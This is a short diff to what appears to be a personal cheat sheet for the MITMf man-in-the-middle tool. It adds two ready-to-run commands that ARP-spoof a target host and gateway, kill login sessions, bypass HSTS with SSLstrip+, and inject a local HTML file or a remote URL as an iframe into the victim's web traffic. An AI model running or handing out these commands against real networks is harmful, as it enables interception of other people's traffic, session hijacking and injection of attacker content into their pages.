@@ -30,6 +30,13 @@ https://www.youtube.com/watch?v=NjNRzJV8Rvo
     -k : kill current login sesson
     --hsts: Enables SSLstrip+ for partial HSTS bypass.
 
+# inject HTML file as Iframe
+mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --html-file /path/to/index.html
+
+# inject HTML url as Iframe
+mitmf --spoof --arp -i eth0 --target 192.168.3.133 --gateway 192.168.3.1 -k --hsts --inject --html-url http://www.somesite.com
+
+
 #############################
 #  todo sslstrip2
 #############################
